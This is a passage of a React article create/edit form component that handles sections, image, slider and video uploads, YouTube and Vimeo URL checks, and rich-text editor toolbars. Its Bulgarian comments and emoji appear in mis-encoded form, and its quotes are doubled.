        // –ü—Ä–∞–≤–∏–º –¥–∏—Ä–µ–∫—Ç–µ–Ω update –Ω–∞ —Å–µ–∫—Ü–∏–∏—Ç–µ –≤ —Å—Ç–µ–π—Ç–∞
        onChangeHandler(null, true, { name: ""sections"", value: updatedSections });

        // –í–ê–ñ–ù–û! –†–∞–∑–º–µ–Ω—è–º–µ –º–µ–¥–∏—è —Ñ–∞–π–ª–æ–≤–µ—Ç–µ —Å—ä—â–æ
        swapSectionsMedia(index, index + 1);

        // –ê–∫—Ç—É–∞–ª–∏–∑–∏—Ä–∞–º–µ –∞–∫—Ç–∏–≤–Ω–∞—Ç–∞ —Å–µ–∫—Ü–∏—è
        setActiveSection(index + 1);
    };

    const handleTagAdd = (e) => {
        e.preventDefault();
        if (newTag.trim()) {
            addTag(newTag.trim());
            setNewTag("""");
        }
    };

    const handlePreviewToggle = () => {
        setPreviewMode(!previewMode);
    };

    const [expandedImageUrl, setExpandedImageUrl] = useState(null);

    const handleImageClick = (url) => {
        setExpandedImageUrl(url);
    };

    const closeExpandedImage = () => {
        setExpandedImageUrl(null);
    };

    // –§—É–Ω–∫—Ü–∏—è –∑–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞ –≤–∏–¥–µ–æ —Ñ–∞–π–ª–æ–≤–µ
    const handleVideoFile = (files) => {
        if (!files || files.length === 0) return;

        const videoFile = files[0]; // –í–∑–µ–º–∞–º–µ —Å–∞–º–æ –ø—ä—Ä–≤–∏—è —Ñ–∞–π–ª –∑–∞ –≤–∏–¥–µ–æ
        if (videoFile) {
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞ –≤–∏–¥–µ–æ —Ñ–æ—Ä–º–∞—Ç
            if (!/video\/(mp4|webm|ogg)/.test(videoFile.type)) {
                alert(t('articles.createForm.invalidVideoFormat'));
                return;
            }

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞ —Ä–∞–∑–º–µ—Ä –Ω–∞ —Ñ–∞–π–ª–∞ (100MB = 104857600 bytes)
            if (videoFile.size > 104857600) {
                alert(t('articles.createForm.videoSizeExceeded'));
                return;
            }

            // –ü–æ–¥–∞–≤–∞–º–µ –¥–∏—Ä–µ–∫—Ç–Ω–æ –∑–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞
            handleMainImageFiles([videoFile]);

            // –î–æ–±–∞–≤—è–º–µ —Ñ–æ—Ä—Å–∏—Ä–∞–Ω–æ –æ–±–Ω–æ–≤—è–≤–∞–Ω–µ, –Ω–æ —Å–µ–≥–∞ –∏–∑–ø–æ–ª–∑–≤–∞–º–µ useReducer –≤–µ—Ä—Å–∏—è—Ç–∞
            setTimeout(() => forceUpdate(), 100);
        }
    };

    // –§—É–Ω–∫—Ü–∏—è –∑–∞ –¥–æ–±–∞–≤—è–Ω–µ –Ω–∞ –≤—ä–Ω—à–Ω–æ –≤–∏–¥–µ–æ –æ—Ç URL
    const handleAddVideoUrl = () => {
        if (!values.mainImage.videoUrl) return;

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ URL —Ñ–æ—Ä–º–∞—Ç–∞ (–æ–ø—Ä–æ—Å—Ç–µ–Ω–∞)
        const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/.+$/;
        const vimeoRegex = /^(https?:\/\/)?(www\.)?vimeo\.com\/.+$/;

        if (!youtubeRegex.test(values.mainImage.videoUrl) && !vimeoRegex.test(values.mainImage.videoUrl)) {
            alert(t('articles.createForm.invalidVideoUrl'));
            return;
        }

        // –ì–µ–Ω–µ—Ä–∏—Ä–∞–º–µ thumbnail URL –∞–∫–æ –µ YouTube
        let thumbnailUrl = """";
        if (youtubeRegex.test(values.mainImage.videoUrl)) {
            // –û–ø–∏—Ç –¥–∞ –∏–∑–≤–ª–µ—á–µ–º –≤–∏–¥–µ–æ ID
            let videoId = """";
            if (values.mainImage.videoUrl.includes(""youtube.com/watch?v="")) {
                videoId = values.mainImage.videoUrl.split(""v="")[1]?.split(""&"")[0];
            } else if (values.mainImage.videoUrl.includes(""youtu.be/"")) {
                videoId = values.mainImage.videoUrl.split(""youtu.be/"")[1]?.split(""?"")[0];
            }

            if (videoId) {
                thumbnailUrl = `https://img.youtube.com/vi/${videoId}/hqdefault.jpg`;
                // –ê–∫–æ –∏–º–∞ thumbnail, —Å–µ—Ç–≤–∞–º–µ –≥–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ
                onChangeHandler({ target: { name: ""mainImage.thumbnail"", value: thumbnailUrl } });
            }
        }

        // –£–≤–µ–¥–æ–º—è–≤–∞–º–µ –ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª—è, —á–µ –≤—ä–Ω—à–Ω–æ—Ç–æ –≤–∏–¥–µ–æ –µ –¥–æ–±–∞–≤–µ–Ω–æ
        alert(t('articles.createForm.videoAddedSuccess'));

        // –ü—Ä–∏–Ω—É–∂–¥–∞–≤–∞–º–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ –¥–∞ —Å–µ –ø—Ä–µ–∏–∑—Ä–∏—Å—É–≤–∞ —Å useReducer –≤–µ—Ä—Å–∏—è—Ç–∞
        forceUpdate();
    };

    // –û–±—â–∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞ —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞
    const editorToolbarOptions = {
        options: ['inline', 'blockType', 'fontSize', 'list', 'textAlign', 'link', 'emoji', 'history'],
        inline: {
            options: ['bold', 'italic', 'underline', 'strikethrough'],
            className: 'editor-toolbar-inline',
        },
          fontSize: {
             options: [12, 14, 16, 18, 20, 24, 28, 32, 36],
            className: 'editor-toolbar-fontsize',
            dropdownClassName: 'editor-fontsize-dropdown',
            inDropdown: true,
        },
        
        blockType: {
            options: ['Normal', 'H2', 'H3', 'H4', 'Blockquote'],
            className: 'editor-toolbar-block',
        },
      
        list: {
            options: ['unordered', 'ordered'],
        },
        textAlign: {
            inDropdown: true,
        },
        link: {
            inDropdown: false,
            showOpenOptionOnHover: true,
        },
        emoji: {
            emojis: [
                'üòÄ', 'üòÅ', 'üòÇ', 'üòÉ', 'üòâ', 'üòã', 'üòé', 'üòç', 'üòÆ', 'üôÇ', 'üôÉ', 'ü§ë', 'ü§î', 'ü§ó', 'ü§ê',
                'ü§°', 'ü§•', 'ü§®', 'ü§©', 'ü§™', 'ü§´', 'ü§¨', 'ü§≠', 'üßê', 'ü§Ø', 'üò¥', 'üòå', 'üòõ', 'üòú', 'üòù'
            ],
        },
    };

    // –û–ø—Ä–æ—Å—Ç–µ–Ω–∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞ –º–∞–ª–∫–∏ –ø–æ–ª–µ—Ç–∞ (alt —Ç–µ–∫—Å—Ç)
    const minimalEditorToolbarOptions = {
        options: ['inline', 'link','fontSize'],
        inline: {
            options: ['bold', 'italic', 'underline'],
            className: 'editor-toolbar-inline-small',
        },
        fontSize: {
             options: [12, 14, 16, 18, 20, 24, 28, 32, 36],
            className: 'editor-toolbar-fontsize',
            dropdownClassName: 'editor-fontsize-dropdown',
            inDropdown: true,
            defaultSize: 16,
        },
        link: {
            inDropdown: false,
            showOpenOptionOnHover: true,
        },
    };

    if (previewMode) {
        return (
            <ArticlePreview
                article={values}
                onBack={handlePreviewToggle}
                mediaFiles={mediaFiles}
                convertEditorToHtml={convertEditorToHtml}
            />
        );
    }

    // –û–ø—Ä–µ–¥–µ–ª—è–º–µ —Ç–µ–∫—Å—Ç–æ–≤–µ—Ç–µ —Å–ø–æ—Ä–µ–¥ —Ä–µ–∂–∏–º–∞ (—Å—ä–∑–¥–∞–≤–∞–Ω–µ –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–∞–Ω–µ)
    const formTitle = isEditMode
        ? t('articles.editArticle.edit_article')
        : t('articles.createForm.createNewArticle');

    const submitButtonText = isEditMode
        ? t('articles.editArticle.save_changes')
        : t('articles.createForm.saveBtn');

    return (
        <div className=""article-create-container"">
            {/* –ü–æ—Å—Ç–æ—è–Ω–Ω–æ —Ñ–∏–∫—Å–∏—Ä–∞–Ω–æ –º–µ–Ω—é - —â–µ —Å–µ –ø–æ–∫–∞–∑–≤–∞ –≤–∏–Ω–∞–≥–∏ */}
            <SectionQuickMenu
                sectionIndex={activeSection !== null ? activeSection : 0}
                totalSections={values.sections.length}
                onAddSection={addSection}
                onMoveUp={moveSectionUp}
                onMoveDown={moveSectionDown}
                onRemove={removeSection}
            />
            <h2 className=""article-form-title"">{formTitle}</h2>

            <form className=""article-form"" onSubmit={onSubmit}>
                {/* –û—Å–Ω–æ–≤–Ω–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è */}
                <div className=""form-section"">
                    <h3>{t('articles.createForm.basicInfo')}</h3>
                    <div className=""form-section-content"">
                        <div className=""form-group-article"">
                            <label htmlFor=""title"">{t('articles.createForm.title')} <span className=""required"">*</span></label>
                            <input
                                type=""text""
                                id=""title""
                                name=""title""
                                value={values.title}
                                onChange={onChangeHandler}
                                onBlur={onBlurHandler}
                                className={errors.title ? ""error"" : """"}
                                placeholder={t('articles.createForm.titlePlaceholder')}
                            />
                            {errors.title && <div className=""error-message"">{errors.title}</div>}
                        </div>

                        <div className=""form-group-article"">
                            <label htmlFor=""slug"">{t('articles.createForm.slug')} <span className=""required"">*</span></label>
                            <input
                                type=""text""
                                id=""slug""
                                name=""slug""
                                value={values.slug}
                                onChange={onChangeHandler}
                                onBlur={onBlurHandler}
                                className={errors.slug ? ""error"" : """"}
                                placeholder={t('articles.createForm.slugPlaceholder')}
                            />
                            {errors.slug && <div className=""error-message"">{errors.slug}</div>}
                        </div>

                        <div className=""form-group-article"">
                            <label htmlFor=""author"">{t('articles.createForm.author')} <span className=""required"">*</span></label>
                            <input
                                type=""text""
                                id=""author""
                                name=""author""
                                value={values.author}
                                onChange={onChangeHandler}
                                onBlur={onBlurHandler}
                                className={errors.author ? ""error"" : """"}
                                placeholder={t('articles.createForm.authorPlaceholder')}
                            />
                            {errors.author && <div className=""error-message"">{errors.author}</div>}
                        </div>

                        <div className=""form-group-article"">
                            <label htmlFor=""publishDate"">{t('articles.createForm.publishDate')}</label>
                            <input
                                type=""date""
                                id=""publishDate""
                                name=""publishDate""
                                value={values.publishDate}
                                onChange={onChangeHandler}
                            />
                        </div>

                        <div className=""form-group-article"">
                            <label htmlFor=""summary"">{t('articles.createForm.summary')} <span className=""required"">*</span></label>
                            <div className={errors.summary ? ""editor-container error"" : ""editor-container""}>
                                <Editor
                                    editorState={values.summary}
                                    onEditorStateChange={(editorState) => handleEditorChange(editorState, ""summary"")}
                                    onBlur={() => handleEditorBlur(""summary"", values.summary)}
                                    toolbar={editorToolbarOptions}
                                    placeholder={t('articles.createForm.summaryPlaceholder')}
                                    wrapperClassName=""editor-wrapper""
                                    editorClassName=""editor-main""
                                    toolbarClassName=""editor-toolbar""
                                    key={i18n.language}
                                />
                            </div>
                            {errors.summary && <div className=""error-message"">{errors.summary}</div>}
                        </div>
                    </div>
                </div>

                {/* –û—Å–Ω–æ–≤–Ω–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∏–ª–∏ –º–µ–¥–∏—è */}
                <div className=""form-section"">
                    <h3>{t('articles.createForm.mainMedia')}</h3>
                    <div className=""form-section-content"">
                        <div className=""media-type-selector"">
                            <button
                                type=""button""
                                className={values.mainImage.type === ""image"" ? ""active"" : """"}
                                onClick={() => handleMainImageTypeChange(""image"")}
                            >
                                <FontAwesomeIcon icon={faImage} /> {t('articles.createForm.singleImage')}
                            </button>
                            <button
                                type=""button""
                                className={values.mainImage.type === ""slider"" ? ""active"" : """"}
                                onClick={() => handleMainImageTypeChange(""slider"")}
                            >
                                <FontAwesomeIcon icon={faSliders} /> {t('articles.createForm.slider')}
                            </button>
                            <button
                                type=""button""
                                className={values.mainImage.type === ""video"" ? ""active"" : """"}
                                onClick={() => handleMainImageTypeChange(""video"")}
                            >
                                <FontAwesomeIcon icon={faVideo} /> {t('articles.createForm.video')}
                            </button>
                        </div>

                        <div className=""media-upload-container"">
                            {(values.mainImage.type === ""image"" || values.mainImage.type === ""slider"") && (
                                <>
                                    <div className=""form-group-article"">
                                        <label htmlFor=""mainImageAlt"">{t('articles.createForm.altText')} <span className=""required"">*</span></label>
                                        <div className={errors[""mainImage.alt""] ? ""editor-container error"" : ""editor-container""}>
                                            <Editor
                                                editorState={values.mainImage.alt}
                                                onEditorStateChange={(editorState) => handleEditorChange(editorState, ""mainImage.alt"")}
                                                onBlur={() => handleEditorBlur(""mainImage.alt"", values.mainImage.alt)}
                                                toolbar={minimalEditorToolbarOptions}
                                                placeholder={t('articles.createForm.imageDescriptionPlaceholder')}
                                                wrapperClassName=""editor-wrapper-small""
                                                editorClassName=""editor-main-small""
                                                toolbarClassName=""editor-toolbar-small""
                                                key={i18n.language}
                                            />
                                        </div>
                                        {errors[""mainImage.alt""] && <div className=""error-message"">{errors[""mainImage.alt""]}</div>}
                                    </div>

                                    {/* –ù–æ–≤–∞ —Å–µ–∫—Ü–∏—è –∑–∞ –¥–æ–±–∞–≤—è–Ω–µ —á—Ä–µ–∑ URL */}
                                    <div className=""form-group-article"">
                                        <label>{t('articles.createForm.addViaUrl')}</label>
                                        <div className=""image-url-input"">
                                            <input
                                                type=""text""
                                                placeholder={t('articles.createForm.imageUrlPlaceholder')}
                                                value={imageUrl}
                                                onChange={(e) => setImageUrl(e.target.value)}
                                                onKeyPress={(e) => e.key === 'Enter' && handleAddImageUrl()}
                                            />
                                            <button
                                                type=""button""
                                                className=""add-image-url-btn""
                                                onClick={handleAddImageUrl}
                                            >
                                                <FontAwesomeIcon icon={faPlus} /> {t('articles.createForm.addBtn')}
                                            </button>
                                        </div>
                                    </div>

                                    <div className=""file-upload-area"">
                                        <div className=""file-upload-icon"">
                                            <FontAwesomeIcon icon={faCloudUploadAlt} />
                                        </div>
                                        <p className=""file-upload-text"">
                                            {t('articles.createForm.dragDropFile')}
                                        </p>
                                        <label htmlFor=""mainImageFile"" className=""file-upload-label"">
                                            <FontAwesomeIcon icon={faUpload} />
                                            {values.mainImage.type === ""image""
                                                ? t('articles.createForm.uploadMainImageBtn')
                                                : t('articles.createForm.uploadSliderImagesBtn')}
                                        </label>
                                        <input
                                            type=""file""
                                            id=""mainImageFile""
                                            multiple={values.mainImage.type === ""slider""}
                                            onChange={(e) => handleMainImageFiles(e.target.files)}
                                            accept=""image/jpeg,image/png,image/jpg,image/webp""
                                            className=""file-input""
                                        />
                                    </div>

                                    {/* –ü—Ä–µ–¥–ø—Ä–µ–≥–ª–µ–¥ –Ω–∞ –≤—Å–∏—á–∫–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è - —Ñ–∞–π–ª–æ–≤–µ –∏ URL-–∏ */}
                                    {(mediaFiles.mainImage.length > 0 || values.mainImage.sources.length > 0) && (
                                        <div className=""media-preview-container"">
                                            {/* –ü–æ–∫–∞–∑–≤–∞–Ω–µ –Ω–∞ —Ñ–∞–π–ª–æ–≤–µ—Ç–µ */}
                                            {mediaFiles.mainImage.map((file, index) => (
                                                <div key={`file-${index}`} className=""image-preview-item"">
                                                    <img
                                                        src={mainImagePreviewUrls[index]}
                                                        alt={t('articles.createForm.preview', { index: index })}
                                                        onClick={() => handleImageClick(mainImagePreviewUrls[index])}
                                                    />
                                                    <button
                                                        type=""button""
                                                        className=""remove-image-btn""
                                                        onClick={() => removeMainImage(index)}
                                                    >
                                                        <FontAwesomeIcon icon={faTimes} />
                                                    </button>
                                                </div>
                                            ))}

                                            {/* –ü–æ–∫–∞–∑–≤–∞–Ω–µ –Ω–∞ URL –∞–¥—Ä–µ—Å–∏—Ç–µ */}
                                            {values.mainImage.sources.map((url, index) => (
                                                <div key={`url-${index}`} className=""image-preview-item"">
                                                    <img
                                                        src={url}
                                                        alt={t('articles.createForm.urlImage', { index: index })}
                                                        onClick={() => handleImageClick(url)}
                                                    />
                                                    <button
                                                        type=""button""
                                                        className=""remove-image-btn""
                                                        onClick={() => removeUrlImage(index)}
                                                    >
                                                        <FontAwesomeIcon icon={faTimes} />
                                                    </button>
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </>
                            )}

                            {/* –†–∞–∑–¥–µ–ª –∑–∞ –≤–∏–¥–µ–æ, –ø–æ–∫–∞–∑–≤–∞ —Å–µ —Å–∞–º–æ –∫–æ–≥–∞—Ç–æ —Ç–∏–ø—ä—Ç –µ –≤–∏–¥–µ–æ */}
                            {values.mainImage.type === ""video"" && (
                                <>
                                    <div className=""form-group-article"">
                                        <label htmlFor=""mainImageAlt"">{t('articles.createForm.videoTitle')} <span className=""required"">*</span></label>
                                        <div className={errors[""mainImage.alt""] ? ""editor-container error"" : ""editor-container""}>
                                            <Editor
                                                editorState={values.mainImage.alt}
                                                onEditorStateChange={(editorState) => handleEditorChange(editorState, ""mainImage.alt"")}
                                                onBlur={() => handleEditorBlur(""mainImage.alt"", values.mainImage.alt)}
                                                toolbar={minimalEditorToolbarOptions}
                                                placeholder={t('articles.createForm.videoTitlePlaceholder')}
                                                wrapperClassName=""editor-wrapper-small""
                                                editorClassName=""editor-main-small""
                                                toolbarClassName=""editor-toolbar-small""
                                                key={i18n.language}
                                            />
                                        </div>
                                        {errors[""mainImage.alt""] && <div className=""error-message"">{errors[""mainImage.alt""]}</div>}
                                    </div>

                                    <div className=""form-group-article"">
                                        <label htmlFor=""videoThumbnail"">{t('articles.createForm.thumbnail')}</label>
                                        <input
                                            type=""text""
                                            id=""videoThumbnail""
                                            name=""mainImage.thumbnail""
                                            value={values.mainImage.thumbnail}
                                            onChange={onChangeHandler}
                                            placeholder={t('articles.createForm.videoThumbnailPlaceholder')}
                                        />
                                    </div>

                                    <div className=""video-upload-options"">
                                        <div className=""form-group-article"">
                                            <label>{t('articles.createForm.chooseVideoMethod')}</label>
                                            <div className=""video-options-buttons"">
                                                <button
                                                    type=""button""
                                                    className=""video-option-btn""
                                                    onClick={() => document.getElementById('mainVideoFile').click()}
                                                >
                                                    <FontAwesomeIcon icon={faUpload} /> {t('articles.createForm.uploadFile')}
                                                </button>
                                                <span className=""or-divider"">{t('articles.createForm.or')}</span>
                                                <div className=""video-url-input"">
                                                    <input
                                                        type=""text""
                                                        placeholder={t('articles.createForm.videoUrlPlaceholder')}
                                                        name=""mainImage.videoUrl""
                                                        value={values.mainImage.videoUrl || ''}
                                                        onChange={onChangeHandler}
                                                        ref={videoUrlInputRef}
                                                        onKeyPress={(e) => e.key === 'Enter' && handleAddVideoUrl()}
                                                    />
                                                    <button
                                                        type=""button""
                                                        className=""add-video-url-btn""
                                                        onClick={handleAddVideoUrl}
                                                    >
                                                        <FontAwesomeIcon icon={faPlus} /> {t('articles.createForm.addBtn')}
                                                    </button>
                                                </div>
                                            </div>
                                        </div>

                                        <div className=""file-upload-area"">
                                            <div className=""file-upload-icon"">
                                                <FontAwesomeIcon icon={faCloudUploadAlt} />
                                            </div>
                                            <p className=""file-upload-text"">
                                                {t('articles.createForm.dragDropVideo')}
                                            </p>
                                            <label htmlFor=""mainVideoFile"" className=""file-upload-label"">
                                                <FontAwesomeIcon icon={faUpload} /> {t('articles.createForm.uploadVideoBtn')}
                                            </label>
                                            <input
                                                type=""file""
                                                id=""mainVideoFile""
                                                onChange={(e) => handleVideoFile(e.target.files)}
                                                accept=""video/mp4,video/webm,video/ogg""
                                                className=""file-input""
                                            />
                                            <p className=""upload-info"">{t('articles.createForm.supportedFormats')}</p>
                                        </div>
                                    </div>

                                    {/* –ü—Ä–µ–¥–ø—Ä–µ–≥–ª–µ–¥ –Ω–∞ –≤–∏–¥–µ–æ - –∏–∑–ø–æ–ª–∑–≤–∞ –∫–µ—à–∏—Ä–∞–Ω–∏—è URL */}
                                    {values.mainImage.type === ""video"" && mediaFiles.mainImage && mediaFiles.mainImage.length > 0 && (
                                        <div className=""video-preview-container"" >
                                            <div className=""video-element-wrapper"">
                                                <video
                                                    controls
                                                    width=""100%""
                                                    height=""auto""
                                                    src={videoPreviewUrl} // –ò–∑–ø–æ–ª–∑–≤–∞–º–µ –∫–µ—à–∏—Ä–∞–Ω–∏—è URL
                                                    poster={values.mainImage.thumbnail || """"}
                                                >
                                                    {t('articles.createForm.browserNotSupport')}
                                                </video>
                                            </div>
                                            <div className=""video-controls-container"">
                                                <div className=""video-info-details"">
                                                    <h4 dangerouslySetInnerHTML={{ __html: convertEditorToHtml(values.mainImage.alt) || t('articles.createForm.videoFile') }}></h4>
                                                    <p>{mediaFiles.mainImage[0]?.name || t('articles.createForm.unnamedFile')}</p>
                                                    <p>{t('articles.createForm.size')} {mediaFiles.mainImage[0]?.size ? (mediaFiles.mainImage[0].size / (1024 * 1024)).toFixed(2) + "" MB"" : t('articles.createForm.unknownSize')}</p>
                                                </div>
                                                <button
                                                    type=""button""
                                                    className=""remove-video-btn""
                                                    onClick={() => removeMainImage(0)}
                                                >
                                                    <FontAwesomeIcon icon={faTimes} /> {t('articles.createForm.removeBtn')}
                                                </button>
                                            </div>
                                        </div>
                                    )}
                                    {/* –î–æ–±–∞–≤—è–º–µ –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä–∞ –Ω–∞ thumbnail –∑–∞ –∫–∞—á–µ–Ω–∏ –≤–∏–¥–µ–æ —Ñ–∞–π–ª–æ–≤–µ */}
                                    {values.mainImage.type === ""video"" && mediaFiles.mainImage && mediaFiles.mainImage.length > 0 && (
                                        <VideoThumbnailGenerator
                                            videoFile={mediaFiles.mainImage[0]}
                                            onThumbnailGenerated={(thumbnailFile) => {
                                                uploadThumbnailFile(thumbnailFile);
                                            }}
                                        />
                                    )}

                                    {/* –ü—Ä–µ–¥–ø—Ä–µ–≥–ª–µ–¥ –∑–∞ –≤—ä–Ω—à–Ω–æ –≤–∏–¥–µ–æ –æ—Ç URL */}
                                    {values.mainImage.type === ""video"" && values.mainImage.videoUrl && !mediaFiles.mainImage?.length && (
                                        <div className=""video-preview-container"">
                                            <VideoPlayer
                                                src={values.mainImage.videoUrl}
                                                thumbnail={values.mainImage.thumbnail || ''}
                                                alt={convertEditorToHtml(values.mainImage.alt) || t('articles.createForm.urlVideo')}
                                                allowDownload={false}
                                            />
                                            <div className=""video-controls-container"">
                                                <div className=""video-info-details"">
                                                    <h4 dangerouslySetInnerHTML={{ __html: convertEditorToHtml(values.mainImage.alt) || t('articles.createForm.externalVideo') }}></h4>
                                                    {/* <p>URL: {values.mainImage.videoUrl}</p> */}
                                                </div>
                                                <button
                                                    type=""button""
                                                    className=""remove-video-btn""
                                                    onClick={() => {
                                                        onChangeHandler({ target: { name: ""mainImage.videoUrl"", value: """" } });
                                                        forceUpdate(); // –ò–∑–ø–æ–ª–∑–≤–∞–º–µ useReducer –≤–µ—Ä—Å–∏—è—Ç–∞
                                                    }}
                                                >
                                                    <FontAwesomeIcon icon={faTimes} /> {t('articles.createForm.removeBtn')}
                                                </button>
                                            </div>
                                        </div>
                                    )}
                                </>
                            )}
                        </div>
                    </div>
                </div>

                {/* –°–µ–∫—Ü–∏–∏ —Å—Ç–∞—Ç–∏–∏ */}
                <div className=""form-section"">
                    <h3>{t('articles.createForm.content')}</h3>
                    <div className=""form-section-content"">
                        <div className=""section-header"" style={{ background: 'none', padding: '0 0 20px 0' }}>
                            <h4>{t('articles.createForm.sections')}</h4>
                            <button type=""button"" className=""add-section-btn"" onClick={addSection}>
                                <FontAwesomeIcon icon={faPlus} /> {t('articles.createForm.addSectionBtn')}
                            </button>
                        </div>

                        {values.sections.map((section, index) => (
                            <div
                                key={index}
                                className={`article-section-item ${activeSection === index ? 'active-section' : ''}`}
                                onClick={() => setActiveSection(index)}
                            >
                                <div className=""section-header"">
                                    <h4>{t('articles.createForm.sectionWithNumber', { number: index + 1 })}</h4>
                                    {values.sections.length > 1 && (
                                        <button
                                            type=""button""
                                            className=""remove-section-btn""
                                            onClick={() => removeSection(index)}
                                        >
                                            <FontAwesomeIcon icon={faMinus} /> {t('articles.createForm.removeBtn')}
                                        </button>
                                    )}
                                </div>

                                <div className=""section-content-create"">
                                    <div className=""form-group-article"">
                                        <label htmlFor={`section-title-${index}`}>{t('articles.createForm.title')} <span className=""required"">*</span></label>
                                        <input
                                            type=""text""
                                            id={`section-title-${index}`}
                                            name={`sections[${index}].title`}
                                            value={section.title}
                                            onChange={onChangeHandler}
                                            onBlur={onBlurHandler}
                                            className={errors[`sections[${index}].title`] ? ""error"" : """"}
                                            placeholder={t('articles.createForm.sectionTitlePlaceholder')}
                                        />
                                        {errors[`sections[${index}].title`] && <div className=""error-message"">{errors[`sections[${index}].title`]}</div>}
                                    </div>

                                    <div className=""form-group-article"">
                                        <label htmlFor={`section-content-${index}`}>{t('articles.createForm.contentSimple')} <span className=""required"">*</span></label>
                                        <div className={errors[`sections[${index}].content`] ? ""editor-container error"" : ""editor-container""}>
                                            <Editor
                                                editorState={section.content}
                                                onEditorStateChange={(editorState) => handleEditorChange(editorState, `sections[${index}].content`)}
                                                onBlur={() => handleEditorBlur(`sections[${index}].content`, section.content)}
                                                toolbar={editorToolbarOptions}
                                                placeholder={t('articles.createForm.sectionContentPlaceholder')}
                                                wrapperClassName=""editor-wrapper""
                                                editorClassName=""editor-main""
                                                toolbarClassName=""editor-toolbar""
                                                key={i18n.language}
                                            />
                                        </div>
                                        {errors[`sections[${index}].content`] && <div className=""error-message"">{errors[`sections[${index}].content`]}</div>}
                                    </div>

                                    <div className=""form-group-article"">
                                        <label htmlFor={`section-image-${index}`}>{t('articles.createForm.sectionImages')}</label>

                                        <div className=""form-group-article"">
                                            <label>{t('articles.createForm.addViaUrl')}</label>
                                            <div className=""image-url-input"">
                                                <input
                                                    type=""text""
                                                    placeholder={t('articles.createForm.imageUrlPlaceholder')}
                                                    value={sectionImageUrls[index] || ''}
                                                    onChange={(e) => setSectionImageUrls({ ...sectionImageUrls, [index]: e.target.value })}
                                                    onKeyPress={(e) => e.key === 'Enter' && handleSectionImageUrl(sectionImageUrls[index], index)}
                                                />
                                                <button
                                                    type=""button""
                                                    className=""add-image-url-btn""
                                                    onClick={() => {
                                                        if (handleSectionImageUrl(sectionImageUrls[index], index)) {
                                                            setSectionImageUrls({ ...sectionImageUrls, [index]: '' });
                                                        }
                                                    }}
                                                >
                                                    <FontAwesomeIcon icon={faPlus} /> {t('articles.createForm.addBtn')}
                                                </button>
                                            </div>
                                        </div>

                                        <div className=""file-upload-area"" style={{ padding: '20px' }}>
                                            <label htmlFor={`section-image-${index}`} className=""file-upload-label"">
                                                <FontAwesomeIcon icon={faUpload} /> {t('articles.createForm.chooseImage')}
                                            </label>
                                            <input
                                                type=""file""
                                                id={`section-image-${index}`}
                                                multiple={true}
                                                onChange={(e) => {
                                                    if (e.target.files && e.target.files.length > 0) {
                                                        handleSectionImageFile(e.target.files, index);
                                                    }
                                                }}
                                                accept=""image/jpeg,image/png,image/jpg,image/webp""
                                                className=""file-input""
                                            />
                                        </div>

                                        {/* –ü–æ–∫–∞–∑–≤–∞–Ω–µ –Ω–∞ –≤—Å–∏—á–∫–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è */}
                                        <div className=""section-images-container"">

                                            {/* –ü–æ–∫–∞–∑–≤–∞–Ω–µ –Ω–∞ –≤—Å–∏—á–∫–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –æ—Ç –º–∞—Å–∏–≤–∞ */}
                                            {Array.isArray(section.image) && section.image.map((image, imgIndex) => {

                                                if (!image || !image.src) return null;

                                                return (
                                                    <div key={`image-${imgIndex}`} className=""section-image-preview"">
                                                        <img
                                                            src={image.src}
                                                            alt={t('articles.createForm.sectionWithNumber', { number: index + 1 })}
                                                            onClick={() => handleImageClick(image.src)}
                                                            onError={(e) => {
                                                                console.error(`–ì—Ä–µ—à–∫–∞ –ø—Ä–∏ –∑–∞—Ä–µ–∂–¥–∞–Ω–µ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ: ${image.src}`);
                                                                e.target.src = '/default-image-placeholder.jpg';
                                                            }}
                                                        />
                                                        <div className=""img-alt-actions"">
                                                            <button
                                                                type=""button""
                                                                className=""img-alt-edit-btn""
                                                                onClick={() => openAltEditModal(index, imgIndex, image)}
                                                                title={t('articles.createForm.editInfo')}
                                                            >
                                                                <FontAwesomeIcon icon={faEdit} />
                                                            </button>
                                                            <button
                                                                type=""button""
                                                                className=""remove-image-btn""
                                                                onClick={() => removeSectionImage(index, imgIndex)}
                                                                title={t('articles.createForm.removeImage')}
                                                            >
                                                                <FontAwesomeIcon icon={faTimes} />
                                                            </button>
                                                        </div>

                                                        {/* ALT —Ç–µ–∫—Å—Ç */}
                                                        {image.alt && convertEditorToHtml(image.alt) && (
                                                            <div className=""img-alt-text-preview"">
                                                                ALT: <span className=""truncated-alt-text"" dangerouslySetInnerHTML={{ __html: convertEditorToHtml(image.alt) }}></span>
                                                            </div>
                                                        )}

                                                        {/* Caption */}
                                                        {image.caption && convertEditorToHtml(image.caption) && (
                                                            <div className=""img-caption-preview"">
                                                                <span className=""truncated-caption-text"" dangerouslySetInnerHTML={{ __html: convertEditorToHtml(image.caption) }}></span>
                                                            </div>
                                                        )}
                                                    </div>
                                                );
                                            })}

                                            {/* –ó–∞ –æ–±—Ä–∞—Ç–Ω–∞ —Å—ä–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç - –∞–∫–æ image –Ω–µ –µ –º–∞—Å–∏–≤, –Ω–æ –∏–º–∞ src */}
                                            {section.image && !Array.isArray(section.image) && section.image.src && (
                                                <div className=""section-image-preview"">
                                                    <img
                                                        src={section.image.src}
